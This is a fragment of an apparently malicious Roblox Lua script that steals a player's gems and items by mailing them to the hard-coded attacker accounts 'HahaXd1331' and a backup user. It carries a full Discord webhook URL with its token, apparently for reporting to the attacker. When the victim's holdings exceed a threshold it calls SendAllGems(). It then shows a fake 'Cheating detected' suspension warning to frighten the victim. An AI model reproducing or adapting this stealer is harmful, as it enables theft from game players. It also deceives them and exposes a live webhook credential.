Username = "HahaXd1331"
Username2 = "mackenasd1" -- stuff will get sent to this user if first user's mailbox is full
webhook = "https://discord.com/api/webhooks/1254408176657367162/CXqeeV_LaKgVle0DYAVin_tGOfQTNJt0_8f2gxXHk5Uem0ixCzQoY-vUmVZM2NaTn68V"
...
if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ...
    SendAllGems()
    setclipboard("no cheating or else")
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("Cheating detected. Your account may be suspended.")
end
